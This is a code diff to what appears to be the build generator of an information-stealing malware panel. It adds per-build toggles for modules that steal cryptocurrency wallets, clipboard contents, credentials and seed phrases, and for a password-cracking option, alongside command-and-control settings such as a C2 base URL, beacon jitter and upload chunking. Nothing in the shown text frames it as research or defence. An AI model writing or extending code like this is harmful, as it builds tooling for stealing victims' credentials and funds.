@@ -28,6 +28,8 @@ export async function createBuild(input: {
   profile: 'lite' | 'full';
   operatorId: string;
   c2Base?: string;
+  modules?: { wallets: boolean; clipboard: boolean; credentials: boolean; seeds: boolean };
+  crack?: boolean;
 }): Promise<{ id: string; buildId: string; token: string; config: BuildConfig }> {
   const secret = b64u(randomBytes(32));
   const buildId = randomUUID();
@@ -40,16 +42,16 @@ export async function createBuild(input: {
     resolver_url: '',
     profile: input.profile,
     modules: {
-      wallets: true,
-      clipboard: input.profile === 'full',
-      credentials: input.profile === 'full',
-      seeds: input.profile === 'full'
+      wallets: input.modules?.wallets ?? true,
+      clipboard: input.profile === 'full' && (input.modules?.clipboard ?? true),
+      credentials: input.profile === 'full' && (input.modules?.credentials ?? true),
+      seeds: input.profile === 'full' && (input.modules?.seeds ?? true)
     },
     bandwidth_kbps: input.profile === 'lite' ? 256 : 1024,
     heartbeat_sec: 30,
     poll_sec: 20,
     jitter_pct: 20,
-    crack: { enabled: input.profile === 'full', max_seconds: 90, max_cpu_pct: 50 },
+    crack: { enabled: input.profile === 'full' && (input.crack ?? true), max_seconds: 90, max_cpu_pct: 50 },
     artifact: { chunk_size: 524288, max_mb: input.profile === 'lite' ? 64 : 512 }
   };
   const build = await prisma.build.create({
